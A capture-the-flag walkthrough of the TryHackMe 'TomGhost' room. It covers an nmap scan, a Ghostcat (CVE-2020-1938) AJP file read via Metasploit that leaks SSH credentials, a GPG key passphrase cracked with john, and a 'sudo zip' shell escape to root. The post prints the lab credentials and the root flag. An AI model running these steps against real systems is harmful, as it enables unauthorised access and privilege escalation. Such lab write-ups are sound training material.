TomGhost is a easy level challenge in THM.

Got the following from the NMAP scan.

```diff
nmap -A -p- -sV -T4 10.10.105.174
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 07:31 EDT                                                                                                                                                                          
Nmap scan report for 10.10.105.174                                                                                                                                                                                                          
Host is up (0.22s latency).                                                                                                                                                                                                                 
Not shown: 65531 closed tcp ports (reset)                                                                                                                                                                                                   
PORT     STATE SERVICE    VERSION                                                                                                                                                                                                           
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                                                                                                      
| ssh-hostkey:                                                                                                                                                                                                                              
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)                                                                                                                                                                              
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)                                                                                                                                                                             
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)                                                                                                                                                                           
53/tcp   open  tcpwrapped                                                                                                                                                                                                                   
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)                                                                                                                                                                                      
| ajp-methods:                                                                                                                                                                                                                              
|_  Supported methods: GET HEAD POST OPTIONS                                                                                                                                                                                                
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/13%OT=22%CT=1%CU=43671%PV=Y%DS=5%DC=T%G=Y%TM=66BB
OS:4765%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)
OS:OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508
OS:ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
OS:ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   30.73 ms  10.17.0.1
2   ... 4
5   634.53 ms 10.10.105.174

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 851.15 seconds

```

We can see multiple ports open. But Tomcat running on port 8080 looks interesting. It is a v9.0.30 of Tomcat. While looking for Tomcat vulnerabilities, I came across CVE-2020-1938 which is associated with this version of Tomcat. So what is this vulnerability?? 
This is also widely known as GhostCat vulnerability. Due to a flaw in the Tomcat AJP protocol, an attacker can read or include any files in the webapp directories of Tomcat.

There is a metasploit module associated with this vulnerability. I used that module.

```diff
msf6 > use  use auxiliary/admin/http/tomcat_ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

[*] Using auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description                                                                                                                                                                                        
   ----      ---------------   --------  -----------                                                                                                                                                                                        
   FILENAME  /WEB-INF/web.xml  yes       File name                                                                                                                                                                                          
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                                                                                             
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
View the full module info with the info, or info -d command.                                                                                                                                                                                
                                                                                                                                                                                                                                            
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.105.174
RHOSTS => 10.10.105.174                                                                                                                                                                                                                     
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8080
RPORT => 8009                                                                                                                                                                                                                               
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.10.105.174
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

[+] 10.10.105.174:8009 - File contents save to: /home/whitedevil/.msf4/loot/20240813075455_default_10.10.105.174_WEBINFweb.xml_509790.txt
[*] Auxiliary module execution completed

```

We are using the default path to web.sml and we can see that we are able to read that file. There seems to be some potential credentials here "skyfuck:8730281lkjlkjdqlksalks". I tried to login to ssh using these credentials and that was a success.
After logging in we can see two files credentials.gpg and tryhackme.asc in the home directory of skyfuck. We need to cd back and cd into Merlin's directory for the user flag. 

Now for privilege escalation, sudo seems to be blocked for skyfuck and there are no interesting files with SUID permissions. Now, the two folder in the home directory of skyfuck seems to be the only way.

We can convert the signature file(.asc) into hash using gpg2john and try to crack that hash using john. For doing so, I used scp command and transferred tryhackme.asc to my host machine. Got the below results after hash cracking

```diff
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2024-08-13 09:39) 5.555g/s 5955p/s 5955c/s 5955C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got a password "alexandru". I tried to use this password and ssh into the machine as root but infortunately this is not the root's password. So I tried with Merlin and Bingo! got access to Merlin's account. Now, I checked if I had sudo access and yes I seemed to have sudo access without password for ZIP 
```diff
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

```

Then I used the following one liner to escalate my privileges to root and cat out the root flag.

```diff
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
$ whoami
root
$ cat /root/root.txt
THM{Z1P_1S_FAKE}

```

----THE END----